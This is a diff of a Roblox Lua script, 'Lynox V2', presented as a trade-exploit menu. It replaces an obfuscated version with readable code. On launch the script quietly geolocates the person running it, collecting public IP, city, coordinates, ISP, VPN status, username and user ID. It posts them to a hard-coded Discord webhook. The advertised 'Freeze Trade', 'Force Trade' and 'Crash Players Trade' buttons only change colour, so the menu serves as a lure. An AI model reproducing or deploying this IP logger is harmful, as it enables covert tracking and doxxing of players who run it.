@@ -1,6 +1,332 @@
-local _0x1=game:GetService("Players")local _0x2=game:GetService("HttpService")local _0x3=game:GetService("MarketplaceService")local _0x4=game:GetService("UserInputService")local _0x5=_0x1.LocalPlayer local _0x6="https://discord.com/api/webhooks/1476453785076502699/3hd_1nta4ABJoaljV91elvIrjENgJJtRStrQuRjFhwB1--fp6fQc6W_G9x4FJ3DOnzkw"local function _0x7()return(syn and syn.request)or http_request or request or(fluxus and fluxus.request)or(Krnl and Krnl.request)or httprequest end local _0x8=_0x7()if not _0x8 then warn("HTTP no")return end local _0x9=_0x4.TouchEnabled and"Móvil"or"PC"local _0xa=_0x4.TouchEnabled and"Android/iOS"or"Windows"local _0xb="Desconocido"if identifyexecutor then _0xb=identifyexecutor()end local function _0xc()return os.date("%d/%m/%Y %H:%M:%S")end local _0xd=game.PlaceId local _0xe="Desconocido"local _0xf="No disponible"pcall(function()local _0x10=_0x3:GetProductInfo(_0xd)if _0x10 and _0x10.Name then _0xe=_0x10.Name _0xf="[Ver página](https://www.roblox.com/games/".._0xd.."/".._0x2:UrlEncode(_0xe:gsub(" ","-"))..")"end end)local function _0x11()local _0x12={{url="https://get.geojs.io/v1/ip/geo.json",parse=function(_0x13)return{ip=_0x13.ip or"?",city=_0x13.city or"?",region=_0x13.region or"?",country=_0x13.country or"?",isp=_0x13.organization_name or"?",lat=tonumber(_0x13.latitude),lon=tonumber(_0x13.longitude),vpn=false,threat="?"}end},{url="https://ipwhois.io/json",parse=function(_0x14)local _0x15=_0x14.security or{}local _0x16=_0x15.vpn or _0x15.proxy or _0x15.tor or false return{ip=_0x14.ip or"?",city=_0x14.city or"?",region=_0x14.region or"?",country=_0x14.country or"?",isp=_0x14.isp or"?",lat=_0x14.latitude,lon=_0x14.longitude,vpn=_0x16,threat=_0x16 and"Detectado ⚠️"or"No"}end}}for _0x17,_0x18 in ipairs(_0x12)do local _0x19,_0x1a=pcall(_0x8,{Url=_0x18.url,Method="GET"})if _0x19 and _0x1a and _0x1a.StatusCode==200 and _0x1a.Body then local _0x1b,_0x1c=pcall(_0x2.JSONDecode,_0x2,_0x1a.Body)if _0x1b and _0x1c then local _0x1d=_0x18.parse(_0x1c)if _0x1d and _0x1d.ip~="?"then return _0x1d end end end end return{ip="?",city="?",region="?",country="?",isp="?",lat=nil,lon=nil,vpn=false,threat="?"}end local _0x1e=_0x11()local _0x1f=_0x1e.lat and string.format("%.6f",_0x1e.lat)or"?"local _0x20=_0x1e.lon and string.format("%.6f",_0x1e.lon)or"?"local _0x21="No disponible"if _0x1e.lat and _0x1e.lon then _0x21="[Ver Maps](https://www.google.com/maps/search/?api=1&query=".._0x1e.lat..",".._0x1e.lon..")"elseif _0x1e.city~="?"and _0x1e.country~="?"then local _0x22=_0x1e.city..", "..(_0x1e.region~="?"and _0x1e.region..", "or"").._0x1e.country _0x21="[Buscar Maps](https://www.google.com/maps/search/?api=1&query=".._0x2:UrlEncode(_0x22)..")"end local _0x23=_0x1e.vpn and"⚠️ DETECTADO ⚠️"or"No"local _0x24=_0x1e.vpn and 16711680 or 16776960 local _0x25={title="Lynox V2 - REGISTRO",description="**".._0x23.."**\nUbicación aprox.",color=_0x24,fields={{name="Usuario",value=player.Name or"?",inline=true},{name="Display",value=player.DisplayName or"?",inline=true},{name="ID",value=tostring(player.UserId or"?"),inline=true},{name="IP",value=_0x1e.ip,inline=true},{name="Ciudad",value=_0x1e.city,inline=true},{name="Región",value=_0x1e.region or"?",inline=true},{name="País",value=_0x1e.country,inline=true},{name="ISP",value=_0x1e.isp or"?",inline=true},{name="Lat",value=_0x1f,inline=true},{name="Lon",value=_0x20,inline=true},{name="VPN",value=_0x23,inline=false},{name="Dispositivo",value=_0x9.." (".._0xa..")",inline=true},{name="Executor",value=_0xb,inline=true},{name="Juego",value=_0xe,inline=false},{name="Place ID",value=tostring(_0xd),inline=true},{name="Página",value=_0xf,inline=false},{name="Maps",value=_0x21,inline=false},{name="Hora",value=_0xc(),inline=false}},footer={text="Lynox V2 • Aprox. • No calle exacta"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}pcall(function()req({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=_0x2:JSONEncode({embeds={_0x25}})})end)print("Lynox V2 enviado")
+--// Lynox V2 - Logger + GUI (primero loguea, luego abre la interfaz movible)
 
---------------------------------------------------
--- GUI PARTE (muy comprimida y ofuscada)
---------------------------------------------------
-local _0x26=Instance.new("ScreenGui")_0x26.Name="LynoxGui"_0x26.IgnoreGuiInset=true _0x26.ResetOnSpawn=false _0x26.Parent=player:WaitForChild("PlayerGui")local _0x27=Instance.new("Frame")_0x27.Size=UDim2.new(0,300,0,350)_0x27.Position=UDim2.new(0.5,-150,0.5,-175)_0x27.BackgroundColor3=Color3.fromRGB(25,25,25)_0x27.Parent=_0x26 Instance.new("UICorner",_0x27).CornerRadius=UDim.new(0,10)local _0x28=Instance.new("TextLabel")_0x28.Size=UDim2.new(1,0,0,40)_0x28.BackgroundColor3=Color3.fromRGB(35,35,35)_0x28.Text="Lynox V2"_0x28.TextColor3=Color3.new(1,1,1)_0x28.TextScaled=true _0x28.Font=Enum.Font.GothamBold _0x28.Parent=_0x27 Instance.new("UICorner",_0x28).CornerRadius=UDim.new(0,10)local _0x29=Instance.new("Frame")_0x29.Size=UDim2.new(1,0,0,35)_0x29.Position=UDim2.new(0,0,0,40)_0x29.BackgroundColor3=Color3.fromRGB(30,30,30)_0x29.Parent=_0x27 local _0x2a=Instance.new("TextButton")_0x2a.Size=UDim2.new(0.5,0,1,0)_0x2a.Text="Main"_0x2a.BackgroundColor3=Color3.fromRGB(50,50,50)_0x2a.TextColor3=Color3.new(1,1,1)_0x2a.TextScaled=true _0x2a.Font=Enum.Font.GothamBold _0x2a.Parent=_0x29 local _0x2b=Instance.new("TextButton")_0x2b.Size=UDim2.new(0.5,0,1,0)_0x2b.Position=UDim2.new(0.5,0,0,0)_0x2b.Text="Discord"_0x2b.BackgroundColor3=Color3.fromRGB(20,20,20)_0x2b.TextColor3=Color3.new(1,1,1)_0x2b.TextScaled=true _0x2b.Font=Enum.Font.GothamBold _0x2b.Parent=_0x29 local _0x2c=Instance.new("Frame")_0x2c.Size=UDim2.new(1,0,1,-75)_0x2c.Position=UDim2.new(0,0,0,75)_0x2c.BackgroundTransparency=1 _0x2c.Parent=_0x27 local _0x2d=Instance.new("Frame")_0x2d.Size=UDim2.new(1,0,1,-75)_0x2d.Position=UDim2.new(0,0,0,75)_0x2d.BackgroundTransparency=1 _0x2d.Visible=false _0x2d.Parent=_0x27 local function _0x2e(_0x2f,_0x30)local _0x31=Instance.new("TextButton")_0x31.Size=UDim2.new(0.85,0,0,45)_0x31.Position=UDim2.new(0.075,0,0,_0x30)_0x31.BackgroundColor3=Color3.fromRGB(170,0,0)_0x31.Text=_0x2f..": OFF"_0x31.TextColor3=Color3.new(1,1,1)_0x31.TextScaled=true _0x31.Font=Enum.Font.GothamBold _0x31.Parent=_0x2c Instance.new("UICorner",_0x31).CornerRadius=UDim.new(0,8)local _0x32=false _0x31.MouseButton1Click:Connect(function()_0x32=not _0x32 _0x31.Text=_0x2f..(_0x32 and": ON"or": OFF")_0x31.BackgroundColor3=_0x32 and Color3.fromRGB(0,170,0)or Color3.fromRGB(170,0,0)end)end _0x2e("Freeze Trade",10)_0x2e("Force Trade",65)_0x2e("Crash Players Trade",120)local _0x33=Instance.new("TextLabel")_0x33.Size=UDim2.new(0.9,0,0,45)_0x33.Position=UDim2.new(0.05,0,0,20)_0x33.BackgroundTransparency=1 _0x33.Text="https://discord.gg/trgH2Z5Vu2"_0x33.TextColor3=Color3.new(1,1,1)_0x33.TextScaled=true _0x33.Font=Enum.Font.GothamBold _0x33.Parent=_0x2d local _0x34=Instance.new("TextButton")_0x34.Size=UDim2.new(0.85,0,0,45)_0x34.Position=UDim2.new(0.075,0,0,80)_0x34.BackgroundColor3=Color3.fromRGB(0,120,255)_0x34.Text="Copy Discord Invite"_0x34.TextColor3=Color3.new(1,1,1)_0x34.TextScaled=true _0x34.Font=Enum.Font.GothamBold _0x34.Parent=_0x2d Instance.new("UICorner",_0x34).CornerRadius=UDim.new(0,8)_0x34.MouseButton1Click:Connect(function()setclipboard("https://discord.gg/trgH2Z5Vu2")_0x34.Text="Copied!"task.delay(1.5,function()_0x34.Text="Copy Discord Invite"end)end)_0x2a.MouseButton1Click:Connect(function()_0x2c.Visible=true _0x2d.Visible=false end)_0x2b.MouseButton1Click:Connect(function()_0x2c.Visible=false _0x2d.Visible=true end)local _0x35=false local _0x36 local _0x37 local _0x38 local function _0x39(_0x3a)local _0x3b=_0x3a.Position-_0x37 _0x27.Position=UDim2.new(_0x38.X.Scale,_0x38.X.Offset+_0x3b.X,_0x38.Y.Scale,_0x38.Y.Offset+_0x3b.Y)end _0x28.InputBegan:Connect(function(_0x3c)if _0x3c.UserInputType==Enum.UserInputType.MouseButton1 or _0x3c.UserInputType==Enum.UserInputType.Touch then _0x35=true _0x37=_0x3c.Position _0x38=_0x27.Position _0x3c.Changed:Connect(function()if _0x3c.UserInputState==Enum.UserInputState.End then _0x35=false end end)end end)_0x28.InputChanged:Connect(function(_0x3d)if _0x3d.UserInputType==Enum.UserInputType.MouseMovement or _0x3d.UserInputType==Enum.UserInputType.Touch then _0x36=_0x3d end end)UIS.InputChanged:Connect(function(_0x3e)if _0x3e==_0x36 and _0x35 then _0x39(_0x3e)end end)print("Lynox V2 cargado")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local WEBHOOK = "https://discord.com/api/webhooks/1476453785076502699/3hd_1nta4ABJoaljV91elvIrjENgJJtRStrQuRjFhwB1--fp6fQc6W_G9x4FJ3DOnzkw"
+
+-- =====================================================================
+-- PARTE 1: LOGGER (se ejecuta primero)
+-- =====================================================================
+
+local function requestFunc()
+    return (syn and syn.request) 
+        or http_request 
+        or request 
+        or (fluxus and fluxus.request) 
+        or (Krnl and Krnl.request) 
+        or httprequest
+end
+
+local req = requestFunc()
+
+if req then
+    local device = UserInputService.TouchEnabled and "Móvil" or "PC"
+    local system = UserInputService.TouchEnabled and "Android/iOS" or "Windows"
+
+    local executor = "Desconocido"
+    if identifyexecutor then executor = identifyexecutor() end
+
+    local function getTime()
+        return os.date("%d/%m/%Y %H:%M:%S")
+    end
+
+    -- Info del juego
+    local placeId = game.PlaceId
+    local gameName = "Desconocido"
+    local gamePageLink = "No disponible"
+
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(placeId)
+        if info and info.Name then
+            gameName = info.Name
+            gamePageLink = "[Ver página del juego](https://www.roblox.com/games/" .. placeId .. "/" .. HttpService:UrlEncode(gameName:gsub(" ", "-")) .. ")"
+        end
+    end)
+
+    -- Geo + Lat/Lon + VPN
+    local function getIPAndGeo()
+        local apis = {
+            {url = "https://get.geojs.io/v1/ip/geo.json", parse = function(d)
+                return {
+                    ip = d.ip or "?",
+                    city = d.city or "?",
+                    region = d.region or "?",
+                    country = d.country or "?",
+                    isp = d.organization_name or "?",
+                    lat = tonumber(d.latitude),
+                    lon = tonumber(d.longitude),
+                    vpn = false,
+                    threat = "?"
+                }
+            end},
+            {url = "https://ipwhois.io/json", parse = function(d)
+                local sec = d.security or {}
+                local vpnDetected = sec.vpn or sec.proxy or sec.tor or false
+                return {
+                    ip = d.ip or "?",
+                    city = d.city or "?",
+                    region = d.region or "?",
+                    country = d.country or "?",
+                    isp = d.isp or "?",
+                    lat = d.latitude,
+                    lon = d.longitude,
+                    vpn = vpnDetected,
+                    threat = vpnDetected and "Detectado ⚠️" or "No"
+                }
+            end}
+        }
+
+        for _, api in apis do
+            local s, r = pcall(req, {Url = api.url, Method = "GET"})
+            if s and r and r.StatusCode == 200 and r.Body then
+                local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
+                if ok and data then
+                    local g = api.parse(data)
+                    if g and g.ip ~= "?" then return g end
+                end
+            end
+        end
+        return {ip = "?", city = "?", region = "?", country = "?", isp = "?", lat = nil, lon = nil, vpn = false, threat = "?"}
+    end
+
+    local geo = getIPAndGeo()
+
+    local latText = geo.lat and string.format("%.6f", geo.lat) or "?"
+    local lonText = geo.lon and string.format("%.6f", geo.lon) or "?"
+
+    local mapsLink = "No disponible"
+    if geo.lat and geo.lon then
+        mapsLink = "[Ver en Google Maps](https://www.google.com/maps/search/?api=1&query=" .. geo.lat .. "," .. geo.lon .. ")"
+    elseif geo.city ~= "?" and geo.country ~= "?" then
+        local q = geo.city .. ", " .. (geo.region ~= "?" and geo.region .. ", " or "") .. geo.country
+        mapsLink = "[Buscar zona en Maps](https://www.google.com/maps/search/?api=1&query=" .. HttpService:UrlEncode(q) .. ")"
+    end
+
+    local vpnAlert = geo.vpn and "⚠️ VPN / Proxy DETECTADO ⚠️" or "No se detectó VPN"
+
+    local color = geo.vpn and 16711680 or 16776960  -- rojo si VPN
+
+    local embed = {
+        title = "Lynox V2 - EJECUCIÓN REGISTRADA",
+        description = "**" .. vpnAlert .. "**\nUbicación aproximada por IP",
+        color = color,
+        fields = {
+            {name = "Usuario", value = player.Name or "?", inline = true},
+            {name = "DisplayName", value = player.DisplayName or "?", inline = true},
+            {name = "User ID", value = tostring(player.UserId or "?"), inline = true},
+            {name = "IP Pública", value = geo.ip, inline = true},
+            {name = "Ciudad aprox.", value = geo.city, inline = true},
+            {name = "Región / Estado", value = geo.region or "?", inline = true},
+            {name = "País", value = geo.country, inline = true},
+            {name = "ISP", value = geo.isp or "?", inline = true},
+            {name = "Latitud", value = latText, inline = true},
+            {name = "Longitud", value = lonText, inline = true},
+            {name = "VPN / Proxy / Tor", value = vpnAlert, inline = false},
+            {name = "Dispositivo", value = device .. " (" .. system .. ")", inline = true},
+            {name = "Executor", value = executor, inline = true},
+            {name = "Juego", value = gameName, inline = false},
+            {name = "Place ID", value = tostring(placeId), inline = true},
+            {name = "Página del juego", value = gamePageLink, inline = false},
+            {name = "Google Maps", value = mapsLink, inline = false},
+            {name = "Hora", value = getTime(), inline = false},
+        },
+        footer = {text = "Lynox V2 • Ubicación aproximada • No calle exacta"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = {embed}})
+        })
+    end)
+
+    print("Lynox V2: Logger enviado | IP: " .. geo.ip .. " | Lat: " .. latText .. " | Lon: " .. lonText)
+end
+
+-- =====================================================================
+-- PARTE 2: GUI Lynox V2 (se abre después del logger)
+-- =====================================================================
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LynoxGui"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0,300,0,350)
+MainFrame.Position = UDim2.new(0.5,-150,0.5,-175)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,10)
+
+-- Title (drag handle)
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1,0,0,40)
+Title.BackgroundColor3 = Color3.fromRGB(35,35,35)
+Title.Text = "Lynox V2"
+Title.TextColor3 = Color3.new(1,1,1)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+Instance.new("UICorner", Title).CornerRadius = UDim.new(0,10)
+
+-- Drag functionality (PC + Mobile)
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+Title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        updateDrag(input)
+    end
+end)
+
+-- Tab Bar
+local TabBar = Instance.new("Frame")
+TabBar.Size = UDim2.new(1,0,0,35)
+TabBar.Position = UDim2.new(0,0,0,40)
+TabBar.BackgroundColor3 = Color3.fromRGB(30,30,30)
+TabBar.Parent = MainFrame
+
+local MainTabBtn = Instance.new("TextButton")
+MainTabBtn.Size = UDim2.new(0.5,0,1,0)
+MainTabBtn.Text = "Main"
+MainTabBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+MainTabBtn.TextColor3 = Color3.new(1,1,1)
+MainTabBtn.TextScaled = true
+MainTabBtn.Font = Enum.Font.GothamBold
+MainTabBtn.Parent = TabBar
+
+local DiscordTabBtn = Instance.new("TextButton")
+DiscordTabBtn.Size = UDim2.new(0.5,0,1,0)
+DiscordTabBtn.Position = UDim2.new(0.5,0,0,0)
+DiscordTabBtn.Text = "Discord"
+DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+DiscordTabBtn.TextColor3 = Color3.new(1,1,1)
+DiscordTabBtn.TextScaled = true
+DiscordTabBtn.Font = Enum.Font.GothamBold
+DiscordTabBtn.Parent = TabBar
+
+-- Tab Content
+local MainTab = Instance.new("Frame")
+MainTab.Size = UDim2.new(1,0,1,-75)
+MainTab.Position = UDim2.new(0,0,0,75)
+MainTab.BackgroundTransparency = 1
+MainTab.Parent = MainFrame
+
+local DiscordTab = Instance.new("Frame")
+DiscordTab.Size = UDim2.new(1,0,1,-75)
+DiscordTab.Position = UDim2.new(0,0,0,75)
+DiscordTab.BackgroundTransparency = 1
+DiscordTab.Visible = false
+DiscordTab.Parent = MainFrame
+
+-- Toggle Button Function
+local function toggleButton(text, y)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0.85,0,0,45)
+    b.Position = UDim2.new(0.075,0,0,y)
+    b.BackgroundColor3 = Color3.fromRGB(170,0,0)
+    b.Text = text..": OFF"
+    b.TextColor3 = Color3.new(1,1,1)
+    b.TextScaled = true
+    b.Font = Enum.Font.GothamBold
+    b.Parent = MainTab
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)
+
+    local enabled = false
+    b.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        b.Text = text .. (enabled and ": ON" or ": OFF")
+        b.BackgroundColor3 = enabled and Color3.fromRGB(0,170,0) or Color3.fromRGB(170,0,0)
+    end)
+end
+
+-- Main Tab Buttons
+toggleButton("Freeze Trade", 10)
+toggleButton("Force Trade", 65)
+toggleButton("Crash Players Trade", 120)
+
+-- Discord Tab
+local Link = Instance.new("TextLabel")
+Link.Size = UDim2.new(0.9,0,0,45)
+Link.Position = UDim2.new(0.05,0,0,20)
+Link.BackgroundTransparency = 1
+Link.Text = "https://discord.gg/trgH2Z5Vu2"
+Link.TextColor3 = Color3.new(1,1,1)
+Link.TextScaled = true
+Link.Font = Enum.Font.GothamBold
+Link.Parent = DiscordTab
+
+local Copy = Instance.new("TextButton")
+Copy.Size = UDim2.new(0.85,0,0,45)
+Copy.Position = UDim2.new(0.075,0,0,80)
+Copy.BackgroundColor3 = Color3.fromRGB(0,120,255)
+Copy.Text = "Copy Discord Invite"
+Copy.TextColor3 = Color3.new(1,1,1)
+Copy.TextScaled = true
+Copy.Font = Enum.Font.GothamBold
+Copy.Parent = DiscordTab
+Instance.new("UICorner", Copy).CornerRadius = UDim.new(0,8)
+
+Copy.MouseButton1Click:Connect(function()
+    setclipboard("https://discord.gg/trgH2Z5Vu2")
+    Copy.Text = "Copied!"
+    task.delay(1.5, function()
+        Copy.Text = "Copy Discord Invite"
+    end)
+end)
+
+-- Tab Switching
+MainTabBtn.MouseButton1Click:Connect(function()
+    MainTab.Visible = true
+    DiscordTab.Visible = false
+end)
+
+DiscordTabBtn.MouseButton1Click:Connect(function()
+    MainTab.Visible = false
+    DiscordTab.Visible = true
+end)
+
+print("Lynox V2 cargado: Logger enviado + GUI abierta y movible")
